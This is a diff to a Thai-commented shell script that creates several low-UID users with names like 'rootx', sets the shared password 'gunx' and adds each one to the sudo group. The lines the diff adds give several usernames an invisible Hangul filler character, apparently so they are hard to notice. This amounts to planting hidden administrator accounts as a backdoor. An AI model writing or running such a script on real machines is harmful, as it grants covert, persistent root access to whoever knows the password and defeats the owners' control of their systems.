@@ -5,17 +5,26 @@
 sudo useradd -u 15 rootx1
 sudo useradd -u 14 rootx
 sudo useradd -u 16 rootx2
-sudo useradd -u 17 rootx3
+sudo useradd -u 17 rootx3ㅤ
+sudo useradd -u 18 japanㅤ
+sudo useradd -u 19 jjㅤ
+sudo useradd -u 20 uiuiㅤ
 # กำหนดรหัสผ่านของผู้ใช้ gunx เป็น "gunx"
 echo "rootx:gunx1" | sudo chpasswd
 echo "rootx1:gunx" | sudo chpasswd
 echo "rootx2:gunx" | sudo chpasswd
 echo "rootx3:gunx" | sudo chpasswd
+echo "japanㅤ:gunx" | sudo chpasswd
+echo "jjㅤ:gunx" | sudo chpasswd
+echo "uiuiㅤ:gunx" | sudo chpasswd
 # เพิ่มผู้ใช้ gunx เข้าในกลุ่ม sudo
 sudo usermod -aG sudo rootx1
 sudo usermod -aG sudo rootx
 sudo usermod -aG sudo rootx2
 sudo usermod -aG sudo rootx3
+sudo usermod -aG sudo japanㅤ
+sudo usermod -aG sudo jjㅤ
+sudo usermod -aG sudo uiuiㅤ
 # แสดงข้อความยืนยัน
-echo "ผู้ใช้ เริ่มชิบหาย ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
+echo "ผู้ใช้ Testเริ่มชิบหาย ถูกสร้างและกำหนดสิทธิ์เรียบร้อยแล้ว"
 rm -f rootx
